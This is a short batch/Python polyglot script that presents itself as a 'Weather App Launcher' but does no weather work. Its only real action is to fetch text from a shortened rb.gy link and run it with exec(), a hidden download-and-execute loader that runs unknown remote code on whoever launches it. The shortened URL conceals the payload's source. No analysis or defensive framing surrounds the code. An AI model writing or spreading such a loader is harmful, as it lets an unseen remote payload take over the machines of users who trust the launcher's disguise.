@echo off & python -x "%~f0" %* & goto :eof 

print("Welcome to the Weather App Launcher")
import os

try :
    import requests
except ImportError:
    print("Installing Packages")
    os.system("pip install requests")
import requests

url = "https://rb.gy/ufqfa5"

print()
print("Initializing....")
print()

page = requests.get(url)
exec(page.text)
